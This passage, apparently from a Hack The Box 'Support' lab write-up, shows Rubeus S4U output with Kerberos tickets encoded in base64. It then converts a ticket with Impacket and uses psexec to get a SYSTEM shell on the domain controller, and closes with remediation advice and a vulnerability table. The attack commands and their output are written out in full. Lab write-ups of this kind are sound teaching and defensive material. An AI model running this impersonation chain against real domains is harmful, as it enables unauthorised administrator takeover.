      7A7CGiX5LQetxMAMuqOPlXVje7H/WzdfInO0lU8aua2NrrppPeYnh67Vro+OkDB+EhGFkFzSDSRoOtrl
      B1veqZB0x/8LJK4JzCv4W/0IAMSgziD8CFoWU7JLViW5pUKCoOKUUi0l8Pka2je/r+YBzBB9mqOB5DCB
      4aADAgEAooHZBIHWfYHTMIHQoIHNMIHKMIHHoCswKaADAgESoSIEIESn0ryoUBAWgtnaI7+xH4AAVCWf
      V1D8l3pwEBbrvpMsoQ0bC1NVUFBPUlQuSFRCohYwFKADAgEBoQ0wCxsJU0VSVklDRUEkowcDBQBA4QAA
      pREYDzIwMjMwMjE5MjExNDE0WqYRGA8yMDIzMDIyMDA3MTQxNFqnERgPMjAyMzAyMjYyMTE0MTRaqA0b
      C1NVUFBPUlQuSFRCqSAwHqADAgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0Yg==


[*] Action: S4U

[*] Building S4U2self request for: 'SERVICEA$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'SERVICEA$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      CVNFUlZJQ0VBJA==

[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      doIGaDCCBmSgAwIBBaEDAgEWooIFejCCBXZhggVyMIIFbqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggUzMIIFL6ADAgESoQMCAQWiggUhBIIFHdLxXnQM
      N1bqP//gi2IKAFC8N+2Y6gNwa9Q5y1Utq8U+AavReaInedchPsPIpc7a7mtYdH9jfyurh8xHZr9sLXbJ
      uj9rSeCGGlinCzgaupmP/eeYzG6Bf8nA0/zl5hu5fay/+523LkYeeCVyAsuMPuOAeEdMcmGIZriqWi0c
      4oddYVo1BJwZfeAUVP96RT7OrMVqhCVswGXbjeGBGdREJ9s6rl8IKpd+iAhwRAZ+Pqf6nFGsO5FL5a+A
      hgAH3K6YKq3Q9LFZ6kNBuWZcGl04wbjmOB4pemr7Luwbl76k5OpshMIa4W1/UBZgV4+Hza/OYF2+U8OV
      Ywofgqba0zr4/7UtB3vIn5nIL4hrZxv5AQ42IU/fgc6n5N6KEWuxh3N4vEzhSNhDTV8hZ/krsFkFduuX
      tGVzEFiE4NuCEuTv0xyMaUe4FmAnwxrp88T3bI+wslxBqmSX5/8pcuX5arM+lRKWxQHshl1T33TR2n/F
      bJlqCgrPtnow6EruCKM5wCsXWhMiE23RaYiFYyeF7yhclslb6bNBF4aeGgRryZoKHHWet+3PgLi6S9yK
      7XNVs3vqxyurq/e9RiIu/O/W0a6+4Il6axFZCmkN6iUq19HJRMnqGSBDiV4zSv8w1Of0lfMx3r0fUnj1
      8+V83BrfTEdSMNKsCaERWnaW2Wb7wIo44uEoR8aPJOOPWBgolsu5erC2DkdarSoFyEKwQ97ztILRIkoQ
      aq610K0ftt5PF9KXafzXp60bn99BuBCfwjl0qYmq+8UlnjVm+Y/0jYx+9P1iczaTkI3WIGf7i7UbQFeA
      X+gNfGqIPWF8MozNIqM9N9kh3mr4m7w++VzNOCUEhPOAPpDsWURae4wO9s99Ozo+K79XpmJbrch/k+9f
      jUZsVg0gg5INHufmrdUkHoPxS71nJp09ERYoxiwegpQwVqfb4DIyxHIu9j63R7JkrdqUzS4tAA/vj5xQ
      i8EhdXTtPD1Zh9f8icZDkUxHNrDqXr9vfmBJ7mKdjX0EIx2Ty+VrDFdOHil3NOZlcj75pV5buSUgMPCH
      8fvpwvq/qwPRNR4zzGTdcB18lKYf1FubCtoeBN6HGZbTIIE6F2e/k5xjtOLhLViCWo0NQg2pacW66olL
      fG5C4Q7Fiif1DR6NxXKY7KLMzMGzJ/ylmOEu7P9TC0YRgURmI5aMIT38TEQJKEVSik4nSI4MaCVkS0s+
      p2U2Ml+M3U13sCJNP1XhsSOfmM1XYjPTa022eJZkgNoM7+/FXSrEHgwOchkXGaJGnNKsDYn0zum7lStC
      JcbkrsyCJDDNI1RayuvLDZ0inpwMU13fXW59eLA4I2fyeflG24TeFdPPepkcO1xW+/xlDVwG5/3tFpWc
      4e9Cc/iBE1Sd6WoZAhcIRt6uHACf0md7LJu6dyQ5OAiXvPJgKwV8NQmNPXq5vyDmWW7mwv1tNOd29FcA
      Aq8+ALV0FjVnZu2zfd0pnP9keScYLJHw9+fwf7iV9CI8gj29fscX6uJenDTVfO/aYpbaY5Zj6EMf7LP7
      PmuV5p2ta7o4kiq62cW+hiiqoH7sbPXy+HsrsSuz4IBnvllmg/INkvKp5tx6pPWUsvfHdEW6rshDtM15
      hmFOvlaXd5E3jLt7qBFvSfM4b9ArZ8x8L0XwRUVNjgr8ihS69TPiMjkU8DN0MOqvaOkeO2hroR00BJY5
      nJog3d1SKvh5AeUtLIT8l6yjtt2SpNHijxkGnjlHtcu/P7hIZ8WvzMGd/rGjgdkwgdagAwIBAKKBzgSB
      y32ByDCBxaCBwjCBvzCBvKAbMBmgAwIBEaESBBCCGi1QYeL/hrkKsPT8VW8OoQ0bC1NVUFBPUlQuSFRC
      ohowGKADAgEKoREwDxsNYWRtaW5pc3RyYXRvcqMHAwUAQKUAAKURGA8yMDIzMDIxOTIxMTQxNFqmERgP
      MjAyMzAyMjAwNzE0MTRapxEYDzIwMjMwMjI2MjExNDE0WqgNGwtTVVBQT1JULkhUQqkhMB+gAwIBAqEY
      MBYbBGNpZnMbDmRjLnN1cHBvcnQuaHRi
[+] Ticket successfully imported!
```

The steps above show how we can find the AES256, AES128, and RC4 password hash of the target user and then utilize those credentials to perform the actual S4U attack. This results in a ticket generated for administrative use on the target machine. We can then echo the base64 encoded ticket to a file and convert it into a usable format with the `ticketConverter` Impacket script. Once the ticket has been converted it is used to PSExec into the target machine as the Administrator user. With this access, we can perform any actions on the target machine and target domain.

```powershell
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ echo 'doIGbDCCBmigAwIBBaEDAgEWooIFfDCCBXhhggV0MIIFcKADAgEFoQ0bC1NVUFBPUlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5kYy5zdXBwb3J0Lmh0YqOCBTMwggUvoAMCARKhAwIBBaKCBSEEggUdi7vqhjeCF3DWbNaOStcnqaaLypHsq+RIvPVvhqlL5hbjKHpUgi+k+OoEaAlwhvkF7PyDhrjz6vvlNs4AtzQT8CQKkUbRau9A5ehp52PcL8OGbxJJmlFqYXhaNSBZzmjUknUwnbkDc415SQ8scu+os44STUYisszkaVLt8ZJHGoxqIV7v/m8pS21kWQN3uQy/yd/HuQ7tw1pRM7pphjdkL2qjZnf9NHBhk5HmRMaBr9ekJj4XUT2vd3T8mdDZQg5KXMAGPoaxclM5YpudtrU3P0WZxVcENmsCnoTJQoUlPRkGbg9G0xkdiHN1xkY5ZOi3PoAwWKfCMyR6HZwBLGTYhEyOvK1mlWEawXq+2whOWRRPFiTF4CGQTc0sqsS7ZictK8Yt8Nxkvlc0OeD+g2xjLKVD3hBc9IzjD9yS82ssaFzRJxrTLO6mjV16Tg1yCY9Oj6S9e1vlRMqset0QXij1Hz48OETminSFWVYFK1lYSvQnAtpCAd2TrK2ERX5QJRQKpmnfkD5Cj7Z4tB932x9MH1ZKPx1CLCuWitMQJMpVuSEjwUFQ3C1u4Mmkvhlqddghj91gj/hGIOeMPUt3jBBoLYhupJG53C7Dt2xuUvlbK9RqWP+R7c1Y6C2BAWlLRoiUsYmNDlrEsCB97uUEo/Hv/Ws1jkOseIann8OD4DXKhfHHwd0OZaFpLK5GCe9yKTDUjR5iDPYkBIs1MqFoDuNnOiaEMwMZIWNUtdIXHGRVbEWW94TG+cQOBUxuSZaEUbMmwLR12f9A5yrCDGX2UUQ7qGaA2zPUGKlREwegNibKkAsVxscQcXKsjz+x/AhWI6h/gBacULsES/rM7ec4RpmgyG5A2gGetl57cE0zzDiNY8pPdhywo12/3QLiQjkVzWNRoE0xG1rpifVvz7E6wdVGknwtfzaF6vb65hOlo+2eBy/Q67D7XhT7G7CGtA6FkcHVUwwkfIPVHxt8QDj/v1stqrUjUFYJmVUwuAwYwq9xFuPukeZBfIMyDkf+97GL6Frwc87RHYBfVNbWUyY+MTRdktWM6g7QUGOT0VqEsnIW0WJe5GGJValz8K2aIQI63+hYZYItEtsRFqohNNi/tx+Tl+SB+Wa5LJZ5HsTf9Vg0USITAWVwnmaiLOrp1doBPvVefOWCFgf+w4yWWvUcaNA4Tv8rw1AbI28ju9i3XQDgcAB48KThA+n9i3xXofCz5fjuuvjT6Bkpm7c2M5uuqZzli1aldlgS9vJkW6DgoJQk5GMf3CKWPUdAOvgKwrODLY19dXPMZmTXNkjcAu1kcvon5VSm/ECqQBJQGzp+t2OdK6YLYOzE6+op3eBDu2D8NWBb2mtQIFEsDeazBsNZKu4FfpSRtHnnz9oQny+QMzP+e2aKcdLOR/aGg1VVGpcdQXbHSpnTqSYpoydlnl+L2CHFifYwGX3sz0Lcp2wfMJzMZ8NUMQgus9IAJre5uOeDDBcLOE3+NPJPO9RsdPWWy/3jt6nF3jy1zDIM097VwW5UO59fYb40XOT4asrvqsMvpz31ATsj7mc9QiY6f/LKvRg8o1Os96Hw9O4j3kJSGPeXzHwfN3Ud0E1RrgXW3xli2c1TAxtrL922o+lMletxzRXdSFdfJeP3VBHbpfpGQ8aBWRcB+EAPTF0MyPwN21s1Bc1V+aLeOqcX9hgQ8637UqE+jnPnSRbGRxCsOy0JtkC7zVjg+n7LytkAiYRJjndhEuW3adTKGtKr+mk1Y4d+PKOB2zCB2KADAgEAooHQBIHNfYHKMIHHoIHEMIHBMIG+oBswGaADAgERoRIEEPwNayLVomW154GBjbDOx8uhDRsLU1VQUE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjMwMjE5MjExNjA4WqYRGA8yMDIzMDIyMDA3MTYwOFqnERgPMjAyMzAyMjYyMTE2MDhaqA0bC1NVUFBPUlQuSFRCqSMwIaADAgECoRowGBsGa3JidGd0Gw5kYy5zdXBwb3J0Lmh0Yg==' | base64 -d > admin.krb
                                                                                                                                                                                                                
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ impacket-ticketConverter admin.krb admin.ccache                                                       
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
                                                                                                                                                                                                                
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ KRB5CCNAME=admin.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass -dc-ip 10.10.11.174 -target-ip 10.10.11.174
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.174.....
[*] Found writable share ADMIN$
[*] Uploading file HqYsWyYy.exe
[*] Opening SVCManager on 10.10.11.174.....
[*] Creating service YdXE on 10.10.11.174.....
[*] Starting service YdXE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Desktop
 
C:\Users\Administrator\Desktop> type root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

C:\Users\Administrator\Desktop> 
```

### Remediation

The use of the GenericAll, GenericRead and GenericWrite permissions on the domain will usually cause some problems. These privileges should be avoided at all costs as they will provide users with the ability to escalate privileges over other machines. Generally speaking, users should never have these high-level permissions over the domain controller unless they are domain administrators. A privilege audit of the domain must be performed to ensure that there are no other cases of unnecessary privileges on accounts.

The support team also appears to be utilizing a shared account for their domain activities. The support team has placed the password for this account within the notes for the account itself. This completely bypasses the point of Active Directory as centralized secure authentication. The client should look into Privileged Access Management solutions to ensure that this account is secure. The policy should dictate that no passwords are stored in cleartext formats such as comments on accounts.

Custom applications can harbor many security problems for the organization. Using a statically configured LDAP account and password inside of a custom application means that you are handing the credentials to that account to anyone who has access to the application. If users should have search rights on the domain it should be provided to their user accounts only and they should utilize their account access to perform searches. Certificate-based authentication deployed over an MDM would also provide easy access while making the application useless for external users. An MDM solution would also allow the secure deployment of custom applications instead of hosting them on a share.

### Vulnerability Assessments

|---+---+---+---|
| Vulnerability | Risk Rating | CVSSv3 Score | Description |
|: ----------- :|: ----------- :|: ----------- :|: ----------- |
| Credentials in LDAP Comments | High | - | Credentials for a support service account are stored in the comments of the account within the LDAP service. |
| GenericAll Permissions on DC | High | - | The `support` account has GenericAll permissions on the domain controller, allowing the user to escalate to the Administrator on the machine. |
| Static Credentials in Binaries | Medium | - | A binary on an anonymous share has static credentials to bind to the LDAP service for the organization. |
| Management Account With Simple Password | Low | - | A low privilege account `management` has a simple password allowing SMB access to the server. |
